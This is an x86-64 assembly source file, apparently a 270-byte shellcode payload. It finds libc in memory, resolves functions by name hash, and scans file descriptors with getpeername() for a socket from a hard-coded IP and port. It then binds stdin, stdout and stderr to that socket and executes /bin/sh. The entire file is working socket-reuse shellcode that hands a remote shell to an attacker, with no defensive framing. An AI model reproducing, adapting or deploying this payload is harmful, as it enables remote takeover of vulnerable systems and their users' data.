# 270 bytes

.section .data
.section .text
.global _start
 
_start:
  push $0x400130ff
  pop %rbx
  shr $0x8, %ebx
 
fast_got:
  mov (%rbx), %rcx
  add 0x10(%rbx), %rcx
 
extract_pointer:
  mov 0x28(%rcx), %rbx
 
find_base:
  dec %rbx
  cmpl $0x464c457f, (%rbx)
jne find_base
 
jmp startup
 
__initialize_world:
  pop %rcx
  jmp _world

 
# at this point, the base pointer of libc is in %rbx
startup:
  call __initialize_world

################
#
#  Takes a function hash in %rbp and base pointer in %rbx
#  >Parses the dynamic section headers of the ELF64 image
#  >Uses ROP to invoke the function on the way back to the
#  -normal return location
#
#  Returns results of function to invoke.
#
invoke_function:
  push %rbp
  push %rbp
  push %rdx
  xor %rdx, %rdx
  push %rdi
  push %rax
  push %rbx      
  push %rsi
  push %rbp
  pop %rdi
 
  read_dynamic_section:
    push %rbx
    pop %rbp
 
   push $0x4c
   pop %rax
   add (%rbx, %rax, 4), %rbx
 
  check_dynamic_type:
    add $0x10, %rbx
    cmpb $0x5, (%rbx)
  jne check_dynamic_type
 
  string_table_found:
    mov 0x8(%rbx), %rax       # %rax is now location of dynamic string table
    mov 0x18(%rbx), %rbx      # %rbx is now a pointer to the symbol table.
 
  check_next_hash:
    add $0x18, %rbx
    push %rdx
    pop %rsi
    xorw (%rbx), %si
    add %rax, %rsi
 
    calc_hash:
      push %rax
      push %rdx
 
      initialize_regs:
        push %rdx
        pop %rax
        cld
 
        calc_hash_loop:
          lodsb
          rol $0xc, %edx
          add %eax, %edx
          test %al, %al
          jnz calc_hash_loop
 
      calc_done:
        push %rdx
        pop %rsi
 
      pop %rdx 
      pop %rax
 
  cmp %esi, %edi
 
  jne check_next_hash
 
  found_hash:
    add 0x8(%rbx,%rdx,4), %rbp
    mov %rbp, 0x30(%rsp)
    pop %rsi
    pop %rbx
    pop %rax
    pop %rdi
    pop %rdx
    pop %rbp
ret

exit:
  push $0x696c4780
  pop %rbp
  xor %rdi, %rdi
  call *%rcx

_world:
  movl $0xf8cc01f7, %ebp   # getpeername() is in %rbp
  push $0x02
  pop %rdi
 
  make_fd_struct:
    lea -0x14(%rsp), %rdx
    movb $0x10, (%rdx)
    lea 0x4(%rdx), %rsi # move struct into rsi
 
  loop:
    inc %di
    jz exit
 
  stack_fix:
    lea 0x14(%rdx), %rsp
 
  get_peer_name:
    sub $0x20, %rsp
    push %rcx
    call *%rcx 
    pop %rcx
 
  check_pn_success:
    test %al, %al
    jne loop
 
  # If we make it here, rbx and rax are 0
  check_ip:
    push $0x1b
    pop %r8
    mov $0xfeffff80, %eax
    not %eax
    cmpl %eax, (%rsp,%r8,4)
    jne loop
 
  check_port:
    movb $0x35, %r8b
    mov $0x2dfb, %ax
    not %eax
    cmpw %ax,(%rsp, %r8 ,2) # (%rbp,%rsi,2)
    jne loop
 
  push $0x70672750
  pop %rbp
 
  reuse:
    xor %rdx, %rdx
    push %rdx
    push %rdx
    pop %rsi
 
    dup_loop:       # redirect stdin, stdout, stderr to socket
      push %rcx
      call *%rcx
      pop %rcx
      inc %esi
      cmp $0x4, %esi
      jne dup_loop
 
  movl $0xf66bbb37, %ebp
 
  xor %rdi, %rdi
  push %rdi                      
  push %rdi
  pop %rsi                     
  pop %rdx                       # Null out %rdx and %rdx (second and third argument)
  mov $0x68732f6e69622f6a,%rdi   # move 'hs/nib/j' into %rdi
  shr $0x8,%rdi                  # null truncate the backwards value to '\0hs/nib/'
  push %rdi      
  push %rsp 
  pop %rdi                       # %rdi is now a pointer to '/bin/sh\0'
 
  call *%rcx
